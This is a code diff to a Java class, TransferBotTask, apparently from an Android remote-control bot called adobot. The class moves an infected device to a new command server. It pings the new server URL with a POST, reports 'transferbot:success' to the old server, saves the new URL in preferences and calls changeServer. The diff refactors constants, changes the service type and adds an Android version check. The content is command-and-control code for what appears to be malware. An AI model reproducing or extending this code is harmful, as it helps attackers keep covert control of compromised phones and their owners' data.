@@ -2,13 +2,14 @@ package com.android.adobot.tasks;
 
 import android.content.Context;
 import android.content.SharedPreferences;
+import android.os.Build;
 import android.util.Log;
 
-import com.android.adobot.CommandService;
-import com.android.adobot.Constants;
+import com.android.adobot.AdobotConstants;
 import com.android.adobot.http.Http;
 import com.android.adobot.http.HttpCallback;
 import com.android.adobot.http.HttpRequest;
+import com.android.adobot.network.NetworkSchedulerService;
 
 import java.util.HashMap;
 
@@ -21,10 +22,10 @@ public class TransferBotTask extends BaseTask {
     private static final String TAG = "TransferBotTask";
 
     private String newServerUrl;
-    private CommandService commandService;
+    private Context commandService;
     SharedPreferences prefs;
 
-    public TransferBotTask(CommandService c, String url) {
+    public TransferBotTask(Context c, String url) {
         setContext(c);
         this.commandService = c;
         this.newServerUrl = url;
@@ -44,11 +45,13 @@ public class TransferBotTask extends BaseTask {
 //                new server is reachable
 //                notify old server
                 sendNotification("transferbot:success", p);
-                prefs = context.getSharedPreferences(Constants.PACKAGE_NAME, Context.MODE_PRIVATE);
-                boolean saved = prefs.edit().putString(Constants.PREF_SERVER_URL_FIELD, newServerUrl).commit();
+                prefs = context.getSharedPreferences(AdobotConstants.PACKAGE_NAME, Context.MODE_PRIVATE);
+                boolean saved = prefs.edit().putString(AdobotConstants.PREF_SERVER_URL_FIELD, newServerUrl).commit();
                 Log.i(TAG, "Saved: " + (saved? "true" : "false"));
-                if (saved)
-                    commandService.changeServer(newServerUrl);
+                if (saved && Build.VERSION.SDK_INT >= 21) {
+                    NetworkSchedulerService  cmd = (NetworkSchedulerService) commandService;
+                    cmd.changeServer(newServerUrl);
+                }
                 else
                     sendNotification("transferbot:failed", p);
             } else {
@@ -73,7 +76,7 @@ public class TransferBotTask extends BaseTask {
 
         //ping server before transferring bot
         Http req = new Http();
-        req.setUrl(newServerUrl + Constants.NOTIFY_URL);
+        req.setUrl(newServerUrl + AdobotConstants.NOTIFY_URL);
         req.setMethod(HttpRequest.METHOD_POST);
         req.setParams(p);
         req.setCallback(pingCb);
